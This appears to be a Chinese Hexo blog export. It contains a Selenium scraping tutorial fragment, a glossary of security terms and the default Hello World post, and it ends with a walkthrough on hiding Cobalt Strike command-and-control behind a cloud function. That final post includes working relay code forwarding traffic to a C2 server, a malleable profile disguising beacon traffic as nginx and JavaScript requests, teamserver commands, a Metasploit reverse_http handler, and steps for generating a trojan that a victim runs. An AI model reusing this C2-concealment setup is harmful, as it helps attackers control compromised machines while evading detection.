<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方式1：By.ID</span><br><span class="line">driver.find_element_by_id()#通过ID属性定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_id()#通过ID属性定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_id()[3]#通过ID属性定位多个元素中的第3个</span><br><span class="line">此处需注意，python中列表索引从0开始，但驱动浏览器执行时，相关执行语言中索引是从1开始哦！</span><br><span class="line">方式2：By.NAME</span><br><span class="line">driver.find_element_by_name()#通过NAME属性定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_name()#通过NAME属性定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_name()[3]#通过NAME属性定位多个元素中的第3个</span><br><span class="line">方式3：By.CLASS_NAME</span><br><span class="line">driver.find_elements_by_class_name()#通过类名定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_class_name()#通过类名定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_class_name()[3]#通过类名定位多个元素中的第3个</span><br><span class="line">方式4：By.TAG_NAME</span><br><span class="line">driver.find_element_by_tag_name()#通过标签名定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_tag_name()#通过标签名定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_tag_name()[3]#通过标签名定位多个元素中的第3个</span><br><span class="line">方式5：By.LINK_TEXT</span><br><span class="line">driver.find_element_by_link_text()#通过超链接(a标签)的文本定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_link_text()#通过超链接(a标签)的文本定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_link_text()[3]#通过超链接(a标签)的文本定位多个元素中的第3个</span><br><span class="line">方式6：By.PARTIAL_LINK_TEXT</span><br><span class="line">driver.find_element_by_partial_link_text()#通过超链接(a标签)的部分文本定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_partial_link_text()#通过超链接(a标签)的部分文本定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_partial_link_text()[3]#通过超链接(a标签)的部分文本定位多个元素中的第3个</span><br><span class="line">方式7：By.CSS_SELECTOR(几乎万用，更切合前端CSS样式语言)</span><br><span class="line">driver.find_element_by_css_selector()#通过CSS选择器定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_css_selector()#通过CSS选择器定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_css_selector()[3]#通过CSS选择器定位多个元素中的第3个</span><br><span class="line">未完待续</span><br><span class="line">方式8：By.XPATH(几乎万用，更切合后端XML语言)</span><br><span class="line">driver.find_element_by_xpath() #通过XPATH定位唯一元素，多个的话默认取第一个</span><br><span class="line">driver.find_elements_by_xpath() #通过XPATH定位多个元素，结果为列表</span><br><span class="line">driver.find_elements_by_xpath() [3]#通过XPATH定位多个元素中的第3个</span><br></pre></td></tr></table></figure>

<h2 id="4-3、鼠标操作"><a href="#4-3、鼠标操作" class="headerlink" title="4.3、鼠标操作"></a><strong>4.3、鼠标操作</strong></h2><p><strong>1、基本操作</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perform()	执行ActionsChains类中存储的所以行为</span><br><span class="line">context_click()	右击</span><br><span class="line">double_click()	双击</span><br><span class="line">drag_and_drop()	拖动</span><br><span class="line">move_to_element()	鼠标悬停</span><br></pre></td></tr></table></figure>

<p><strong>2、拖拽</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver.common.action_chains import ActionChains</span><br><span class="line">action_chains &#x3D; webdriver.ActionChains(driver)</span><br><span class="line">action_chains.drag_and_drop_by_offset(source, targetOffsetX - 2, 0).perform()</span><br></pre></td></tr></table></figure>

<h2 id="4-4、键盘操作"><a href="#4-4、键盘操作" class="headerlink" title="4.4、键盘操作"></a><strong>4.4、键盘操作</strong></h2><p>使用send_keys()方法时，需要先进行以下的导入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">#找到提交按钮</span><br><span class="line">buttion_search &#x3D; browser.find_element_by_class_name(&#39;s_search&#39;)   </span><br><span class="line">buttion_search.click()   #相当于点击按钮</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>方法</th>
<th>对应键盘操作</th>
</tr>
</thead>
<tbody><tr>
<td>send_keys(Keys.BACK_SPACE)</td>
<td>删除键（BackSpace）</td>
</tr>
<tr>
<td>send_keys(Keys.SPACE)</td>
<td>空格键（Space）</td>
</tr>
<tr>
<td>send_keys(Keys.TAB)</td>
<td>指标键</td>
</tr>
<tr>
<td>send_keys(Keys.ESCAPE)</td>
<td>回退键（）Esc</td>
</tr>
<tr>
<td>send_keys(Keys.ENTER)</td>
<td>回车键</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘a’)</td>
<td>全选（ctrl +a）</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘c’)</td>
<td>复制</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘x’)</td>
<td>剪切</td>
</tr>
<tr>
<td>send_keys(Keys.CONTROL,‘v’)</td>
<td>粘贴</td>
</tr>
<tr>
<td>send_keys(Keys.F1)</td>
<td>键盘F1</td>
</tr>
</tbody></table>
<h2 id="4-5、Frame窗口切换"><a href="#4-5、Frame窗口切换" class="headerlink" title="4.5、Frame窗口切换"></a><strong>4.5、Frame窗口切换</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.switch_to.frame() 切换窗口</span><br><span class="line"></span><br><span class="line">driver.switch_to.frame(driver.find_element_by_id(&quot;iframe&quot;)) #切换到frame里边</span><br></pre></td></tr></table></figure>



<h2 id="4-6、根据元素定位坐标"><a href="#4-6、根据元素定位坐标" class="headerlink" title="4.6、根据元素定位坐标"></a><strong>4.6、根据元素定位坐标</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kw &#x3D; self.driver.find_element_by_id(&#39;kw&#39;) </span><br><span class="line">kw_x &#x3D; kw.location.get(&#39;x&#39;)#百度搜索框的x坐标 </span><br><span class="line">kw_y &#x3D; kw.location.get(&#39;y&#39;)#百度搜索框的y坐标</span><br></pre></td></tr></table></figure>



<h2 id="4-7、根据坐标进行点击"><a href="#4-7、根据坐标进行点击" class="headerlink" title="4.7、根据坐标进行点击"></a><strong>4.7、根据坐标进行点击</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver from selenium.webdriver.common.action_chains import ActionChains ActionChains(dr).move_by_offset(500, 100).click().perform()</span><br></pre></td></tr></table></figure>



<h2 id="4-8、弹窗处理"><a href="#4-8、弹窗处理" class="headerlink" title="4.8、弹窗处理"></a><strong>4.8、弹窗处理</strong></h2><p>当页面出现了弹窗提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert &#x3D; driver.switch_to_alert()</span><br></pre></td></tr></table></figure>



<h2 id="4-9、展开shadow-root"><a href="#4-9、展开shadow-root" class="headerlink" title="4.9、展开shadow-root"></a><strong>4.9、展开shadow-root</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#但是在最新版本的chrome 无法使用</span><br><span class="line">def show_shadow(element):</span><br><span class="line">    # 展开shadow</span><br><span class="line">    shadow_root &#x3D; browser.execute_script(&#39;return arguments[0].shadowRoot&#39;, element)</span><br><span class="line">    return shadow_root</span><br><span class="line">domain_view &#x3D; browser.find_element_by_tag_name(&#39;ip-address-view&#39;)  # 找到name&#x3D;domain-view的元素</span><br><span class="line">shadow &#x3D; show_shadow(domain_view)  # 展开shadowRoot</span><br><span class="line">report &#x3D; shadow.find_element_by_id(&#39;report&#39;)  # 找到id为report的元素</span><br></pre></td></tr></table></figure>



<h2 id="4-10、页面切换"><a href="#4-10、页面切换" class="headerlink" title="4.10、页面切换"></a><strong>4.10、页面切换</strong></h2><p>一个浏览器肯定会有很多窗口，所以我们肯定要有方法来实现窗口的切换。切换窗口的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.switch_to.window(&quot;this is window name&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="4-11、execute-script"><a href="#4-11、execute-script" class="headerlink" title="4.11、execute_script"></a><strong>4.11、execute_script</strong></h2><p>有些在页面上无法定位的元素，需要执行js操作的时候，就需要用此方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute_script(script, *args)</span><br><span class="line"></span><br><span class="line">js&#x3D;&quot;window.scrollTo(0,document.body.scrollHeight)&quot; #scrollTo滚动条 driver.execute_script(js)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全专业术语</title>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/</url>
    <content><![CDATA[<div class="note default simple"><h1 id="1-CMS"><a href="#1-CMS" class="headerlink" title="1.CMS"></a>1.CMS</h1></div>

<p>ContentManagementSystem的缩写，意为”内容管理系统”。</p>
<p>CMS是一种位于WEB前端和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容管理系统是一个很泛的概念：从商业门户网站的新闻系统到个人的Weblog都可以称作发布系统。</p>
<div class="note default simple"><h1 id="2-WAF"><a href="#2-WAF" class="headerlink" title="2.WAF"></a>2.WAF</h1></div>

<p>Web应用防护系统（也称：网站应用级<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=135662&ss_c=ssc.citiao.link">入侵防御系统</a>。英文：WebApplicationFirewall，简称：WAF）</p>
<p>WAF是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品，主要用于防御针对网络应用层的攻击，像SQL注入、跨站脚本攻击、参数篡改、应用平台漏洞攻击、拒绝服务攻击等。它可以在HTTP流量到达服务器前检测可疑访问。同时，也能防止web应用回去某些未授权的数据。</p>
<p>常见的有：安全狗，D盾，宝塔、玄武盾 </p>
<div class="note default simple"><h1 id="3-CDN"><a href="#3-CDN" class="headerlink" title="3.CDN"></a>3.CDN</h1></div>

<p>内容分发网络，英文：Content Delivery Network</p>
<p>CDN是构建在网络之上的内容分发网络。CDN的基本原理是广泛采用各种<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=8230101&ss_c=ssc.citiao.link">缓存服务器</a>，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。</p>
<h1 id="旁注与C段嗅探的意义"><a href="#旁注与C段嗅探的意义" class="headerlink" title="旁注与C段嗅探的意义"></a>旁注与C段嗅探的意义</h1><div class="note default simple"><h1 id="4-旁注"><a href="#4-旁注" class="headerlink" title="4.旁注"></a>4.旁注</h1></div>

<p>从同台服务器上的其他网站上得到漏洞。利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵。</p>
<div class="note default simple"><h1 id="5-C段嗅探"><a href="#5-C段嗅探" class="headerlink" title="5.C段嗅探"></a>5.C段嗅探</h1></div>

<p>每个IP有ABCD四个段，</p>
<p>如：192.168.0.1，A段就是192，B段是168，C段是0，D段是1。</p>
<p>C段嗅探的意思就是拿下它同C段中的其中一台服务器。</p>
<p>在渗透中，当无法在网站找到漏洞或无法成功渗透的情况下，这时可采用旁注或C段思路进行渗透。</p>
<div class="note default simple"><h1 id="6-IDS"><a href="#6-IDS" class="headerlink" title="6.IDS"></a>6.IDS</h1></div>

<p>侵检测系统，英文：Intrusion Detection Systems。</p>
<p>IDS是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。</p>
<div class="note default simple"><h1 id="7-IPS"><a href="#7-IPS" class="headerlink" title="7.IPS"></a>7.IPS</h1></div>

<p>入侵防御系统，英文：Intrusion Prevention System</p>
<p>IPS系统是电脑网络安全设施，是对防病毒软件和防火墙的补充。 IPS系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p>
<div class="note default simple"><h1 id="8-横幅（banner）"><a href="#8-横幅（banner）" class="headerlink" title="8.横幅（banner）"></a>8.横幅（banner）</h1></div>

<p>一般是指一种特殊类型的在线广告资源或广告图片，通常显示在网页的顶部或侧面。它是一种HTML构造，用于显示给定的广告，并在单击时将用户带到广告商的站点。</p>
<div class="note default simple"><h1 id="9-POC"><a href="#9-POC" class="headerlink" title="9.POC"></a>9.POC</h1></div>

<p>全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码</p>
<div class="note default simple"><h1 id="10-EXP"><a href="#10-EXP" class="headerlink" title="10.EXP"></a>10.EXP</h1></div>

<p>全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<div class="note default simple"><p>PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，PoC 通常是无害的，Exp 通常是有害的</p>
<h1 id="11-PAYLOAD"><a href="#11-PAYLOAD" class="headerlink" title="11.PAYLOAD"></a>11.PAYLOAD</h1></div>

<p>中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
]]></content>
      <categories>
        <category>web相关</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>云函数和cs并派生到msf</title>
    <url>/%E4%BA%91%E5%87%BD%E6%95%B0%E5%92%8Ccs%E5%B9%B6%E6%B4%BE%E7%94%9F%E5%88%B0msf/</url>
    <content><![CDATA[<h1 id="云函数-amp-CS-amp-MSF"><a href="#云函数-amp-CS-amp-MSF" class="headerlink" title="云函数&amp;CS&amp;MSF"></a>云函数&amp;CS&amp;MSF</h1><h2 id="一、云函数"><a href="#一、云函数" class="headerlink" title="一、云函数"></a>一、云函数</h2><h3 id="1、新建云函数"><a href="#1、新建云函数" class="headerlink" title="1、新建云函数"></a>1、新建云函数</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101355697-1645092605528.png" alt="image-20211029101355697"></p>
<h3 id="2、创建自定义模板"><a href="#2、创建自定义模板" class="headerlink" title="2、创建自定义模板"></a>2、创建自定义模板</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101717459-1645092605528.png" alt="image-20211029101717459"></p>
<h3 id="3、下滑页面，写入代码"><a href="#3、下滑页面，写入代码" class="headerlink" title="3、下滑页面，写入代码"></a>3、下滑页面，写入代码</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029101943247-1645092605528.png" alt="image-20211029101943247"></p>
<p>云函数内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import socket,time</span><br><span class="line">import requests</span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    c2 &#x3D; &quot;http:&#x2F;&#x2F;服务器ip&quot;</span><br><span class="line">    # event&#x3D;json.dumps(event)</span><br><span class="line">    path &#x3D; event[&#39;path&#39;]</span><br><span class="line">    # # print(path)</span><br><span class="line">    headers &#x3D; event[&#39;headers&#39;]</span><br><span class="line">    ip &#x3D; event[&#39;requestContext&#39;][&#39;sourceIp&#39;]</span><br><span class="line">    # # # # # try:</span><br><span class="line">    headers[&#39;X-Forwarded-For&#39;] &#x3D; ip</span><br><span class="line">   </span><br><span class="line">    if event[&#39;httpMethod&#39;] &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        resp&#x3D;requests.get(c2+path,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    else:</span><br><span class="line">        resp&#x3D;requests.post(c2+path,data&#x3D;event[&#39;body&#39;],headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    response &#x3D; &#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: True,</span><br><span class="line">        &quot;statusCode&quot;: resp.status_code,</span><br><span class="line">        &quot;headers&quot;: dict(resp.headers),</span><br><span class="line">        &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1]</span><br><span class="line">    &#125;</span><br><span class="line">    return response </span><br><span class="line">#进行测试，返回值error可能存在格式问题。</span><br></pre></td></tr></table></figure>



<h3 id="4、创建API触发器"><a href="#4、创建API触发器" class="headerlink" title="4、创建API触发器"></a>4、创建API触发器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102153774-1645092605528.png" alt="image-20211029102153774"></p>
<h3 id="5、修改API参数长度"><a href="#5、修改API参数长度" class="headerlink" title="5、修改API参数长度"></a>5、修改API参数长度</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220217182030297.png" alt="image-20220217182030297"></p>
<p>修改后发布即可</p>
<p><img src= "/img/loading.gif" data-lazy-src="../../../user/download/CS/%25E4%25BA%2591%25E5%2587%25BD%25E6%2595%25B0%25E5%2592%258Ccs%25E5%25B9%25B6%25E6%25B4%25BE%25E7%2594%259F%25E5%2588%25B0msf/image-20211029102331066.png" alt="image-20211029102331066"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102404624-1645092605528.png" alt="image-20211029102404624"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029102748778-1645092605528.png" alt="image-20211029102748778"></p>
<h3 id="6、查看API"><a href="#6、查看API" class="headerlink" title="6、查看API"></a>6、查看API</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103023818-1645092605528.png" alt="image-20211029103023818"></p>
<p><strong>可以使用80和443两个端口</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029103133988-1645092605528.png" alt="image-20211029103133988"></p>
<h2 id="二、Cobalt-Strike"><a href="#二、Cobalt-Strike" class="headerlink" title="二、Cobalt Strike"></a>二、Cobalt Strike</h2><h3 id="1、创建CS配置文件-cs-profile"><a href="#1、创建CS配置文件-cs-profile" class="headerlink" title="1、创建CS配置文件  cs.profile"></a>1、创建CS配置文件  cs.profile</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0&quot;;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">        set headers &quot;Server, Content-Type, Cache-Control, Connection, X-Powered-By&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nginx&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;max-age&#x3D;1&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        set trust_x_forwarded_for &quot;true&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2、服务器运行cs服务器"><a href="#2、服务器运行cs服务器" class="headerlink" title="2、服务器运行cs服务器"></a>2、服务器运行cs服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  服务器IP[和云函数的一致] 密码 cs.profile</span><br></pre></td></tr></table></figure>

<h3 id="3、攻击机运行cs"><a href="#3、攻击机运行cs" class="headerlink" title="3、攻击机运行cs"></a>3、攻击机运行cs</h3><p>可以写个shell脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029104901511-1645092605528.png" alt="image-20211029104901511"></p>
<h3 id="4、创建监听"><a href="#4、创建监听" class="headerlink" title="4、创建监听"></a>4、创建监听</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111712002-1645092605528.png" alt="image-20211029111712002"></p>
<h3 id="5、生成木马"><a href="#5、生成木马" class="headerlink" title="5、生成木马"></a>5、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029111956739-1645092605529.png" alt="image-20211029111956739"></p>
<h3 id="6、受害机运行木马"><a href="#6、受害机运行木马" class="headerlink" title="6、受害机运行木马"></a>6、受害机运行木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113321079-1645092605529.png" alt="image-20211029113321079"></p>
<h3 id="7、成功上线"><a href="#7、成功上线" class="headerlink" title="7、成功上线"></a>7、成功上线</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029113811026-1645092605529.png" alt="image-20211029113811026"></p>
<h3 id="8、执行命令获取返回值【成功】"><a href="#8、执行命令获取返回值【成功】" class="headerlink" title="8、执行命令获取返回值【成功】"></a>8、执行命令获取返回值【成功】</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114054919-1645092605529.png" alt="image-20211029114054919"></p>
<h2 id="三、CS派生MSF"><a href="#三、CS派生MSF" class="headerlink" title="三、CS派生MSF"></a>三、CS派生MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set lhost 192.168.223.137[攻击机IP]</span><br><span class="line">set lport 9999</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http [注意payload要和cs设置的一致]</span><br></pre></td></tr></table></figure>

<h3 id="2、CS创建新的监听器"><a href="#2、CS创建新的监听器" class="headerlink" title="2、CS创建新的监听器"></a>2、CS创建新的监听器</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114642961-1645092605547.png" alt="image-20211029114642961"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114755031-1645092605547.png" alt="image-20211029114755031"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20211029114822858-1645092605548.png" alt="image-20211029114822858"></p>
<p>失败emmmm</p>
]]></content>
      <categories>
        <category>安全</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
</search>
